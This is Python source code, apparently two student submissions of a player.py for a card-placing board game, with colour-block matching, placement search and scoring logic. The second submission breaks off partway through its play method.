                if phc <= (len(self.baseplate[0])-len(self.hand[card].rot1[0])):
                    for pos in range(lhr+1,phr):
                        if pos > 0 and pos <= (len(self.baseplate)-len(self.hand[card].rot1)):
                            invalid = 0
                            for r in range(len(self.hand[card].rot1)):
                                for c in range(len(self.hand[card].rot1[0])):
                                    if self.baseplate[pos+r][c+phc] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot1)):
                                    for c in range(len(self.hand[card].rot1[0])):
                                        self.baseplate[r+pos][c+phc] = self.hand[card].rot1[r][c]
                                returned = self.hand[card].rot1
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ pos,phc,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = pos
                                self.coord[-1][1] = phc
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [pos,phc,returned]
                            
                if lhr >= 0:
                    for pos in range(lhc+1,phc):
                        if pos > 0 and pos <= (len(self.baseplate[0])-len(self.hand[card].rot1[0])):
                            invalid = 0
                            for r in range(len(self.hand[card].rot1)):
                                for c in range(len(self.hand[card].rot1[0])):
                                    if self.baseplate[lhr+r][c+pos] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot1)):
                                    for c in range(len(self.hand[card].rot1[0])):
                                        self.baseplate[r+lhr][c+pos] = self.hand[card].rot1[r][c]
                                returned = self.hand[card].rot1
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ lhr,pos,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = lhr
                                self.coord[-1][1] = pos
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [lhr,pos,returned]
                            
                if phr <= (len(self.baseplate)-len(self.hand[card].rot1)):
                    for pos in range(lhc+1,phc):
                        if pos > 0 and pos <= (len(self.baseplate[0])-len(self.hand[card].rot1[0])):
                            invalid = 0
                            for r in range(len(self.hand[card].rot1)):
                                for c in range(len(self.hand[card].rot1[0])):
                                    if self.baseplate[phr+r][c+pos] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot1)):
                                    for c in range(len(self.hand[card].rot1[0])):
                                        self.baseplate[r+phr][c+pos] = self.hand[card].rot1[r][c]
                                returned = self.hand[card].rot1
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ phr,pos,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = phr
                                self.coord[-1][1] = pos
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [phr,pos,returned]



                lhr = self.coord[base][0] - len(self.hand[card].rot2)
                lhc = self.coord[base][1] - len(self.hand[card].rot2[0])
                phr = self.coord[base][2] + self.coord[base][0]
                phc = self.coord[base][3] + self.coord[base][1]
                if lhc >= 0:
                    for pos in range(lhr+1,phr):
                        if pos > 0 and pos <= (len(self.baseplate)-len(self.hand[card].rot2)):
                            invalid = 0
                            for r in range(len(self.hand[card].rot2)):
                                for c in range(len(self.hand[card].rot2[0])):
                                    if self.baseplate[pos+r][c+lhc] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot2)):
                                    for c in range(len(self.hand[card].rot2[0])):
                                        self.baseplate[r+pos][c+lhc] = self.hand[card].rot2[r][c]
                                returned = self.hand[card].rot2
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ pos,lhc,returned ]]   
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = pos
                                self.coord[-1][1] = lhc
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                   
                                return [pos,lhc,returned]
                                    
                if phc <= (len(self.baseplate[0])-len(self.hand[card].rot2[0])):
                    for pos in range(lhr+1,phr):
                        if pos > 0 and pos <= (len(self.baseplate)-len(self.hand[card].rot2)):
                            invalid = 0
                            for r in range(len(self.hand[card].rot2)):
                                for c in range(len(self.hand[card].rot2[0])):
                                    if self.baseplate[pos+r][c+phc] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot2)):
                                    for c in range(len(self.hand[card].rot2[0])):
                                        self.baseplate[r+pos][c+phc] = self.hand[card].rot2[r][c]
                                returned = self.hand[card].rot2
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ pos,phc,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = pos
                                self.coord[-1][1] = phc
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [pos,phc,returned]
                            
                if lhr >= 0:
                    for pos in range(lhc+1,phc):
                        if pos > 0 and pos <= (len(self.baseplate[0])-len(self.hand[card].rot2[0])):
                            invalid = 0
                            for r in range(len(self.hand[card].rot2)):
                                for c in range(len(self.hand[card].rot2[0])):
                                    if self.baseplate[lhr+r][c+pos] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot2)):
                                    for c in range(len(self.hand[card].rot2[0])):
                                        self.baseplate[r+lhr][c+pos] = self.hand[card].rot2[r][c]
                                returned = self.hand[card].rot2
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ lhr,pos,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = lhr
                                self.coord[-1][1] = pos
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [lhr,pos,returned]
                            
                if phr <= (len(self.baseplate)-len(self.hand[card].rot2)):
                    for pos in range(lhc+1,phc):
                        if pos > 0 and pos <= (len(self.baseplate[0])-len(self.hand[card].rot2[0])):
                            invalid = 0
                            for r in range(len(self.hand[card].rot2)):
                                for c in range(len(self.hand[card].rot2[0])):
                                    if self.baseplate[phr+r][c+pos] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot2)):
                                    for c in range(len(self.hand[card].rot2[0])):
                                        self.baseplate[r+phr][c+pos] = self.hand[card].rot2[r][c]
                                returned = self.hand[card].rot2
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ phr,pos,returned ]]  
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = phr
                                self.coord[-1][1] = pos
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                    
                                return [phr,pos,returned]

        return []


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    sedlaon9
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/sedlaon9______________________
        player.py
import base as BASE
import random, time, sys, os
from copy import deepcopy
from PIL import Image, ImageDraw


def lmap(iter, func):
    return list(map(func, iter))


def lfilt(iter, func):
    return list(filter(func, iter))


class Board:
    def __init__(self, W, H, placed_cards, free_cards) -> None:
        self.w = W
        self.h = H
        self.inside_color_blocks = {}
        self._get_cache_matrix = [[None for x in range(self.w)] for y in range(self.h)]

        self.placed_cards = []
        for card in placed_cards:
            # print("Adding card:", card)
            self.place_safe_SC(card)
        self.free_cards = free_cards

    def _cached_card_place_SC(self, card):
        self.placed_cards.append(card)
        # add the card reference to the _get_cache_matrix fro O(1) lookup
        for x in range(card.x, card.x + card.w):
            for y in range(card.y, card.y + card.h):
                self._get_cache_matrix[y][x] = card

        # filter the edges only for those that are free and can be connected to
        for col in self.inside_color_blocks:
            for block in self.inside_color_blocks[col]:
                block["edges"] = lfilt(block["edges"], self._is_valid_edge_check)

        # re-sort inside color blocks
        for col in self.inside_color_blocks:
            self.inside_color_blocks[col].sort(key=lambda el: -el["len"])

    # check that the edges are actually still edges
    def _is_valid_edge_check(self, edge):
        # neighbor position in corrct direction
        xn = yn = -1

        # get the edge direction and calculate the position of the neighbor in taht direction
        if edge[2] == "top":
            xn = edge[0]
            yn = edge[1] - 1
        elif edge[2] == "bottom":
            xn = edge[0]
            yn = edge[1] + 1
        elif edge[2] == "right":
            xn = edge[0] + 1
            yn = edge[1]
        elif edge[2] == "left":
            xn = edge[0] - 1
            yn = edge[1]

        # value -1 means that there is no card at that space
        # value 0 means that there is a card, but that card space has no color
        return self.get(xn, yn) < 0

    # THIS FUNCTION DOESN'T MODIFY THE STATE, IT JUST READS IT
    # returns:
    #   1) an array of edge matches, where each match consits of:
    #       - the color of the matched blocks
    #       - the card block
    #       - all the disturbed board blocks
    #       - all the edges that have been matched
    #   2) all of the blocks inside the card that could not be matched in the format:
    #       - color,
    #       - card,
    #       - card block
    def _find_block_matchings(self, card):
        # otherwise, we have to match up the newly placed card with all existing cards and update the edges
        all_matches = []
        unmatched_blocks = []
        for col in card.inside_color_blocks:
            # keep track of affected board blocks, so that if a board block is affected by two card blocks at the same time, they can merge
            affected_board_blocks = []

            for card_block in card.inside_color_blocks[col]:
                match_found = False
                mtch = None

                # make sure we have blocks of this color
                if col in self.inside_color_blocks:
                    for card_edge in card_block["edges"]:
                        for board_block in self.inside_color_blocks[col]:
                            for board_edge in board_block["edges"]:
                                # make sure the members match up in possible approach direction:
                                dir_tuple = (card_edge[2], board_edge[2])

                                # make sure the edge directions match up
                                if dir_tuple in [
                                    ("left", "right"),
                                    ("right", "left"),
                                    ("top", "bottom"),
                                    ("bottom", "top"),
                                ]:
                                    # this is relative position, so it has to be converted
                                    absolute_card_edge_x = card.x + card_edge[0]
                                    absolute_card_edge_y = card.y + card_edge[1]
                                    # this is an absolute position
                                    absolute_board_edge_x = board_edge[0]
                                    absolute_board_edge_y = board_edge[1]

                                    # delta x + delta y
                                    dist = abs(
                                        absolute_card_edge_x - absolute_board_edge_x
                                    ) + abs(
                                        absolute_card_edge_y - absolute_board_edge_y
                                    )

                                    # make sure the edges are right next to eachother
                                    if dist == 1:
                                        if not match_found:
                                            # first match found
                                            match_found = True

                                            # init the match object
                                            mtch = (
                                                col,  # block color
                                                card_block,  # card block
                                                (
                                                    [board_block]
                                                    if (
                                                        board_block
                                                        not in affected_board_blocks
                                                    )
                                                    else []
                                                ),  # board blocks set
                                                [
                                                    board_edge,
                                                    (
                                                        absolute_card_edge_x,
                                                        absolute_card_edge_y,
                                                        card_edge[2],
                                                    ),
                                                ],  # edges to delete
                                            )

                                            affected_board_blocks.append(board_block)
                                        else:
                                            # another affected board block
                                            if board_block not in mtch[2]:
                                                if (
                                                    board_block
                                                    not in affected_board_blocks
                                                ):
                                                    mtch[2].append(board_block)
                                                    affected_board_blocks.append(
                                                        board_block
                                                    )

                                            # another matching edge for the exact same block found
                                            # add them, so that they will be deleted, but the are wo'nt get double-counted
                                            mtch[3].append(board_edge)
                                            mtch[3].append(
                                                (
                                                    absolute_card_edge_x,
                                                    absolute_card_edge_y,
                                                    card_edge[2],
                                                )
                                            )
                                    elif dist < 1:
                                        print("EDGES ARE OVERLAPPING!!")

                if not match_found:
                    unmatched_blocks.append((col, card, card_block))
                else:
                    all_matches.append(mtch)

        # for m in all_matches:
        # print(m)
        return (all_matches, unmatched_blocks)

    def _combine_matches(
        self,
        abs_blocks,
        rel_blocks=[],
        matching_edges=[],
        accumulation_board_block=None,
    ):
        if accumulation_board_block == None:
            accumulation_board_block = {
                "members": [],
                "edges": [],
                "len": 0,
            }

        # connect together all of the board absolute blocks, that have now been merged by the addition of the card
        for i in range(0, len(abs_blocks)):
            accumulation_board_block["members"] += abs_blocks[i]["members"]
            accumulation_board_block["edges"] += abs_blocks[i]["edges"]
            accumulation_board_block["len"] += abs_blocks[i]["len"]

        for card, card_block in rel_blocks:
            # now add the relatively placed blocks to the accumulated block
            # convert to absolute positional values
            accumulation_board_block["members"] += lmap(
                card_block["members"],
                lambda tup: (card.x + tup[0], card.y + tup[1]),
            )
            # convert to absolute positional values
            accumulation_board_block["edges"] += lmap(
                card_block["edges"],
                lambda tup: (card.x + tup[0], card.y + tup[1], tup[2]),
            )

        # remove the matched up and now hidden edges from all these merges
        for edge in matching_edges:
            if edge in accumulation_board_block["edges"]:
                accumulation_board_block["edges"].remove(edge)

        # update the total length
        accumulation_board_block["len"] += card_block["len"]

        return accumulation_board_block

    def _get_contribution(self, card, glob_x, glob_y):
        start_x = card.x
        start_y = card.y
        card.x = glob_x
        card.y = glob_y

        # find the matching
        (all_matches, unmatches) = self._find_block_matchings(card)

        # some edge matches have been found, so we calculate the total contribution
        contribution = 0
        if len(all_matches) != 0:
            # some matching edges have been found, so we can combine the inside_color_blocks
            for mtch in all_matches:
                (block_color, card_block, board_blocks, edges_to_delete) = mtch

                # combine all of the matched blocks together
                accumulation_board_block = self._combine_matches(
                    board_blocks, [(card, card_block)]
                )

                contribution += accumulation_board_block["len"]

        card.x = start_x
        card.y = start_y

        return contribution

    # THIS FUNCTION CHANGES STATE
    def place_safe_SC(self, card):
        # COLOR BLOCK MERGING LOGIC
        # if we are placing the first card, simply copy the inside color blocks
        if len(self.placed_cards) == 0:
            self.inside_color_blocks = deepcopy(card.inside_color_blocks)

            # convert edges and members positions to absolute position
            for col in self.inside_color_blocks:
                for block in self.inside_color_blocks[col]:
                    for i in range(len(block["edges"])):
                        block["edges"][i] = (
                            block["edges"][i][0] + card.x,
                            block["edges"][i][1] + card.y,
                            block["edges"][i][2],
                        )
                    for i in range(len(block["members"])):
                        block["members"][i] = (
                            block["members"][i][0] + card.x,
                            block["members"][i][1] + card.y,
                        )
        else:
            # find the matching
            (all_matches, unmatches) = self._find_block_matchings(card)

            # some edge matches have been found, so we calculate the total contribution
            if len(all_matches) != 0:
                # some matching edges have been found, so we can combine the inside_color_blocks
                for mtch in all_matches:
                    (block_color, card_block, board_blocks, edges_to_delete) = mtch

                    # combine all of the matched blocks together
                    self._combine_matches(
                        board_blocks[1:],
                        [(card, card_block)],
                        edges_to_delete,
                        (
                            None if len(board_blocks) == 0 else board_blocks[0]
                        ),  # this blouck will become the accumulate
                    )

                    for obsolete_block in board_blocks[1:]:
                        # remove the board blocks which have been merged from the total inside blocks collection
                        self.inside_color_blocks[block_color].remove(obsolete_block)

            # any blocks from the card, that have not been matched are simply added as more islands
            for unmatch in unmatches:
                (unmatch_col, unmatch_card, unmatch_block) = unmatch

                if unmatch_col not in self.inside_color_blocks:
                    # if our board doesn't have color blocks of this color, init it
                    self.inside_color_blocks[unmatch_col] = []

                # convert the block to absolute positions:
                lonely_block = {
                    "len": unmatch_block["len"],
                    "members": lmap(
                        unmatch_block["members"],
                        lambda tup: (
                            tup[0] + unmatch_card.x,
                            tup[1] + unmatch_card.y,
                        ),
                    ),
                    "edges": lmap(
                        unmatch_block["edges"],
                        lambda tup: (
                            tup[0] + unmatch_card.x,
                            tup[1] + unmatch_card.y,
                            tup[2],
                        ),
                    ),
                }

                # append these new blocks
                self.inside_color_blocks[unmatch_col].append(lonely_block)

        # all merge precesses are now done, so we finalise the placement:
        self._cached_card_place_SC(card)

        # # print and plot the board for testing
        # for col in self.inside_color_blocks:
        # print(col, self.inside_color_blocks[col])
        # self.plot()

    # this fucntion does not handle rotations
    def find_best_card_pos(self, card):
        translation_x = {"left": -1, "right": 1, "top": 0, "bottom": 0}
        translation_y = {"left": 0, "right": 0, "top": -1, "bottom": 1}

        possible_placements = []
        for col in card.inside_color_blocks:
            if col not in self.inside_color_blocks:
                continue
            for card_block in card.inside_color_blocks[col]:
                for card_edge in card_block["edges"]:
                    for board_block in self.inside_color_blocks[col]:
                        for board_edge in board_block["edges"]:
                            # make sure the members match up in possible approach direction:
                            dir_tuple = (card_edge[2], board_edge[2])

                            # make sure the edge directions match up
                            if dir_tuple in [
                                ("left", "right"),
                                ("right", "left"),
                                ("top", "bottom"),
                                ("bottom", "top"),
                            ]:
                                # calculate the required card position for this to work:
                                glob_x = (
                                    board_edge[0]
                                    + translation_x[board_edge[2]]
                                    - card_edge[0]
                                )
                                glob_y = (
                                    board_edge[1]
                                    + translation_y[board_edge[2]]
                                    - card_edge[1]
                                )

                                # check that the card does not go offscreen
                                if (
                                    glob_x < 0
                                    or glob_x + card.w > self.w
                                    or glob_y < 0
                                    or glob_y + card.h > self.h
                                ):
                                    continue

                                # check that the card won't collide with any other
                                has_space = True
                                # change card location for collision checking purposes
                                start_x = card.x
                                start_y = card.y
                                card.x = glob_x
                                card.y = glob_y
                                # try collision with every other card
                                for other_card in self.placed_cards:
                                    if Card.check_overlap(other_card, card):
                                        has_space = False
                                        break
                                # reset pos
                                card.x = start_x
                                card.y = start_y
                                if not has_space:
                                    # try another edge matching location - this one does not work
                                    continue

                                # calcualte the contribution score
                                contribution = self._get_contribution(
                                    card, glob_x, glob_y
                                )
                                possible_placements.append(
                                    (contribution, glob_x, glob_y)
                                )

        # try finding 0 score solution
        if len(possible_placements) == 0:
            for glob_x in range(0, self.w - card.w + 1):
                for glob_y in range(0, self.h - card.h + 1):
                    # check a few easy points using cache to be faster
                    # corner
                    p1_passes = self.get(glob_x, glob_y) == -1

                    if p1_passes:
                        # check that the card won't collide with any other card
                        has_space = True
                        has_touch = False
                        # change card location for collision checking purposes
                        start_x = card.x
                        start_y = card.y
                        card.x = glob_x
                        card.y = glob_y
                        # try collision with every other card
                        for other_card in self.placed_cards:
                            if Card.check_overlap(other_card, card):
                                has_space = False
                                break
                        # check for touches with all other
                        for other_card in self.placed_cards:
                            if Card.check_touch(other_card, card):
                                has_touch = True
                                break
                        # reset pos
                        card.x = start_x
                        card.y = start_y

                        if has_touch and has_space:
                            # this is a viable 0 score solution
                            possible_placements.append((0, glob_x, glob_y))

        possible_placements.sort(key=lambda entry: -entry[0])
        if len(possible_placements) == 0:
            return None
        return possible_placements[0]

    # this function handles rotations
    def select_best_card(self, cards):
        best_picks = []
        for card in cards:
            for card_rot in card.rotations:
                best_pos = self.find_best_card_pos(card_rot)
                if best_pos != None:
                    best_picks.append(
                        (
                            best_pos[0],  # score
                            card_rot,  # the specific rotation rotation
                            best_pos[1],  # x pos
                            best_pos[2],  # y pos
                            card,  # parent card
                        )
                    )

        best_picks.sort(key=lambda entry: -entry[0])
        if len(best_picks) == 0:
            return None
        return best_picks[0]

    def get(self, x, y):
        # TODO: could implement fast global lookup by saving a matrix of corresponsing cards on the board:
        # trying to go outside of the board, so we return inf
        if x < 0 or x >= self.w or y < 0 or y >= self.h:
            return float("inf")

        card = self._get_cache_matrix[y][x]
        if card != None:
            # the position inside the card
            x_in = x - card.x
            y_in = y - card.y
            return card.get(x_in, y_in)
        else:
            # return -1 if there is no card at that place, but it is a valid position.
            # This way we can check validity of an edge by checking if the next neighbor in it's direction is <= 0
            return -1

        # # trying to go outside of the board, so we return inf
        # if x < 0 or x >= self.w or y < 0 or y >= self.h:
        #     return float("inf")

        # for card in self.placed_cards:
        #     if (
        #         x >= card.x
        #         and x < card.x + card.w
        #         and y >= card.y
        #         and y < card.y + card.h
        #     ):
        #         x_in = x - card.x
        #         y_in = y - card.y

        #         return card.get(x_in, y_in)

        # # return -1 if there is no card at that place, but it is a valid position.
        # # This way we can check validity of an edge by checking if the next neighbor in it's direction is <= 0
        # return -1

    def plot(self):
        plt.figure(figsize=(self.w / 3, self.h / 3))
        plt.xlim((0, self.w))
        plt.ylim((self.h, 0))
        plt.xticks(
            [x + 0.5 for x in range(0, self.w)], [str(x) for x in range(0, self.w)]
        )
        plt.yticks(
            [x + 0.5 for x in range(0, self.h)], [str(x) for x in range(0, self.h)]
        )
        plt.xlabel("x")
        plt.ylabel("y")

        cols = ["#ccc", "#f00", "#0f0", "#00f", "#0ff", "#ff0", "#f0f"]
        for card in self.placed_cards:
            for x in range(card.w):
                for y in range(card.h):
                    plt.scatter(
                        card.x + x + 0.5,
                        card.y + y + 0.5,
                        c=cols[card.get(x, y)],
                        marker="s",
                        s=100,
                    )

        for col in self.inside_color_blocks:
            for block in self.inside_color_blocks[col]:
                for edge in block["edges"]:
                    if edge[2] == "top":
                        plt.scatter(
                            edge[0] + 0.5,
                            edge[1] + 0.5 - 0.5,
                            c=cols[self.get(edge[0], edge[1])],
                            marker="^",
                            s=14,
                        )
                    elif edge[2] == "bottom":
                        plt.scatter(
                            edge[0] + 0.5,
                            edge[1] + 0.5 + 0.5,
                            c=cols[self.get(edge[0], edge[1])],
                            marker="v",
                            s=14,
                        )
                    elif edge[2] == "left":
                        plt.scatter(
                            edge[0] + 0.5 - 0.5,
                            edge[1] + 0.5,
                            c=cols[self.get(edge[0], edge[1])],
                            marker="<",
                            s=14,
                        )
                    elif edge[2] == "right":
                        plt.scatter(
                            edge[0] + 0.5 + 0.5,
                            edge[1] + 0.5,
                            c=cols[self.get(edge[0], edge[1])],
                            marker=">",
                            s=14,
                        )


class Card:
    def __init__(self, x, y, w, h, cells, generate_rotations=False):
        self.x = x
        self.y = y
        self.w = w
        self.h = h
        self.cells = cells

        self.placed = False

        self.rotations = [self]
        if generate_rotations:

            def rotate90(m):
                return [
                    [m[j][i] for j in range(len(m))]
                    for i in range(len(m[0]) - 1, -1, -1)
                ]

            self.rotations.append(
                Card(self.x, self.y, self.h, self.w, rotate90(self.cells))
            )
            self.rotations.append(
                Card(self.x, self.y, self.w, self.h, rotate90(rotate90(self.cells)))
            )
            self.rotations.append(
                Card(
                    self.x,
                    self.y,
                    self.h,
                    self.w,
                    rotate90(rotate90(rotate90(self.cells))),
                )
            )

        self.inside_color_blocks = {}
        self.find_boundary_paths()

    def find_boundary_paths(self):
        # go through each cell around the boundary
        boundary_cells_by_color = {}

        # top side
        for x in range(self.w):
            cell = self.get(x, 0)
            if cell != 0:
                if cell not in boundary_cells_by_color:
                    boundary_cells_by_color[cell] = []

                boundary_cells_by_color[cell].append((x, 0, "top"))

        # bottom side
        for x in range(self.w):
            cell = self.get(x, self.h - 1)
            if cell != 0:
                if cell not in boundary_cells_by_color:
                    boundary_cells_by_color[cell] = []

                boundary_cells_by_color[cell].append((x, self.h - 1, "bottom"))

        # left side
        for y in range(self.h):
            cell = self.get(0, y)
            if cell != 0:
                if cell not in boundary_cells_by_color:
                    boundary_cells_by_color[cell] = []

                boundary_cells_by_color[cell].append((0, y, "left"))

        # right side
        for y in range(self.h):
            cell = self.get(self.w - 1, y)
            if cell != 0:
                if cell not in boundary_cells_by_color:
                    boundary_cells_by_color[cell] = []

                boundary_cells_by_color[cell].append((self.w - 1, y, "right"))

        # finding all color blocks
        self.inside_color_blocks = {}
        # print("Inside color blocks:")
        for col in boundary_cells_by_color:
            if col not in self.inside_color_blocks:
                self.inside_color_blocks[col] = []

            # floodfill to find all color blocks
            while len(boundary_cells_by_color[col]) > 0:
                start_point = boundary_cells_by_color[col][0][0:2]

                queue = [start_point]
                colored_block_members = []
                while len(queue) > 0:
                    block = queue.pop(0)

                    for translation in [(0, 1), (1, 0), (0, -1), (-1, 0)]:
                        x = block[0] + translation[0]
                        y = block[1] + translation[1]
                        # check that we do not go outside of the card
                        if x >= 0 and x < self.w and y >= 0 and y < self.h:
                            if self.get(x, y) == col:
                                if ((x, y) not in queue) and (
                                    (
                                        x,
                                        y,
                                    )
                                    not in colored_block_members
                                ):
                                    queue.append((x, y))

                    colored_block_members.append((block[0], block[1]))

                edges = []
                for boundary in boundary_cells_by_color[col]:
                    if (boundary[0], boundary[1]) in colored_block_members:
                        edges.append(boundary)
                for edge in edges:
                    boundary_cells_by_color[col].remove(edge)

                self.inside_color_blocks[col].append(
                    {
                        "len": len(colored_block_members),
                        "members": colored_block_members,
                        "edges": edges,
                    }
                )

            self.inside_color_blocks[col].sort(key=lambda x: -x["len"])
            # print(col, self.inside_color_blocks[col])

    def print(self):
        print("-" * self.w + f" {self.x},{self.y}")
        for y in range(self.h):
            print(" ".join(lmap(self.cells[y], str)))
        print("-" * self.w)
        print()

    @staticmethod
    def parse(line, is_placed=False, generate_rotations=False):
        nums = lmap(line.split(" "), int)
        if is_placed:
            (y, x) = nums[0:2]
            (h, w) = nums[2:4]
            _cells = nums[4:]
        else:
            x = y = -1
            (h, w) = nums[0:2]
            _cells = nums[2:]

        cells = []
        for i in range(h):
            cells.append(_cells[i * w : (i + 1) * w])

        # print(x, y, w, h, cells, _cells)

        c = Card(x, y, w, h, cells, generate_rotations)
        c.placed = is_placed
        return c

    def get(self, x, y):
        return self.cells[y][x]

    @staticmethod
    def plot_cards(cards):
        fig, axs = plt.subplots(
            4, len(cards), figsize=(2 * len(cards), 2 * 4), squeeze=False
        )
        cols = ["#ccc", "#f00", "#0f0", "#00f", "#0ff", "#ff0", "#f0f"]

        for r in range(4):
            for i in range(len(cards)):
                card = cards[i].rotations[r]
                for x in range(card.w):
                    for y in range(card.h):
                        axs[r][i].scatter(
                            x + 0.5,
                            y + 0.5,
                            c=cols[card.get(x, y)],
                            marker="s",
                            s=100,
                        )

                for col in card.inside_color_blocks:
                    for block in card.inside_color_blocks[col]:
                        for edge in block["edges"]:
                            if edge[2] == "top":
                                axs[r][i].scatter(
                                    edge[0] + 0.5,
                                    edge[1] + 0.5 - 0.5,
                                    c=cols[card.get(edge[0], edge[1])],
                                    marker="^",
                                    s=14,
                                )
                            elif edge[2] == "bottom":
                                axs[r][i].scatter(
                                    edge[0] + 0.5,
                                    edge[1] + 0.5 + 0.5,
                                    c=cols[card.get(edge[0], edge[1])],
                                    marker="v",
                                    s=14,
                                )
                            elif edge[2] == "left":
                                axs[r][i].scatter(
                                    edge[0] + 0.5 - 0.5,
                                    edge[1] + 0.5,
                                    c=cols[card.get(edge[0], edge[1])],
                                    marker="<",
                                    s=14,
                                )
                            elif edge[2] == "right":
                                axs[r][i].scatter(
                                    edge[0] + 0.5 + 0.5,
                                    edge[1] + 0.5,
                                    c=cols[card.get(edge[0], edge[1])],
                                    marker=">",
                                    s=14,
                                )

                axs[r][i].set_xlim(-0.5, card.w + 0.5)
                axs[r][i].set_ylim(card.h + 0.5, -0.5)

    @staticmethod
    def check_overlap(R1, R2):
        # Check if one rectangle is completely to the left or right of the other
        if R1.x + R1.w <= R2.x or R2.x + R2.w <= R1.x:
            return False

        # Check if one rectangle is completely above or below the other
        if R1.y + R1.h <= R2.y or R2.y + R2.h <= R1.y:
            return False

        return True

    @staticmethod
    def check_touch(R1, R2):
        # Check if they are exactly touching on the left or right side
        touching_horizontally = (R1.x + R1.w == R2.x or R2.x + R2.w == R1.x) and not (
            R1.y + R1.h <= R2.y or R2.y + R2.h <= R1.y
        )

        # Check if they are exactly touching on the top or bottom side
        touching_vertically = (R1.y + R1.h == R2.y or R2.y + R2.h == R1.y) and not (
            R1.x + R1.w <= R2.x or R2.x + R2.w <= R1.x
        )

        return touching_horizontally or touching_vertically


# basic cards with colors 1 and 2
# note that Brute can provide you also other cards!
C44a = [[0, 1, 2, 0], [1, 1, 2, 2], [2, 2, 1, 1], [0, 2, 1, 0]]

C44b = [[0, 0, 1, 0], [1, 1, 1, 0], [0, 2, 2, 2], [0, 2, 0, 0]]

C53b = [[0, 1, 0], [0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 0, 0]]

C53c = [[0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 2, 2], [0, 2, 0]]

C33a = [[0, 1, 0], [1, 1, 2], [0, 0, 2]]

C33c = [[1, 2, 1], [2, 2, 2], [1, 2, 1]]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        start = time.time()

        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "OSP v0.1"

        self.turn = 0

        self.my_score = 0
        self.my_cards = []
        self.opponent_score = 0
        self.opponents_cards = []

        for i in range(len(cardsAtHand)):
            crd = cardsAtHand[i]
            self.my_cards.append(
                Card(-1, -1, crd[0].__len__(), crd.__len__(), crd, True)
            )
            self.opponents_cards.append(
                Card(-1, -1, crd[0].__len__(), crd.__len__(), crd, True)
            )

        self.my_board = Board(boardCols, boardRows, [], cardsAtHand)

        end = time.time()
        print("__init__() took:", (end - start) * 1000, "ms")
        print("-" * 15)

    def play(self, newCardOnDesk):
        start = time.time()
        """this method is called during the game.
        The input argument newCardOnDesk is:
        - [] if other player didn't place any card in his move), or
        - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board

        Return value:
        - [ row, col, cardMatrix ] if you want to place a card, or
        - [] if no card can be placed
        """

        # recommened steps
        # step 0: write newCardOnDesk to list of cards that are on the board game
        # step 1: compute all possible placement of your all (so for available) cards
        # step 2: evaluate each placement, i.e., compute score for it
        # step 3: select card that you want to place to the game board, mark it as used (not available in future)
        # step 4: return your placement, or [] if no placement can be made
        # the following code DOES NOT provides correct moves,
        # it just return random card at random position

        if len(newCardOnDesk) == 3:
            if self.turn == 0:
                self.turn = 1
            else:
                self.turn += 1   
                
            self.cardsOnDesk += [newCardOnDesk]

            new_card = newCardOnDesk[2]
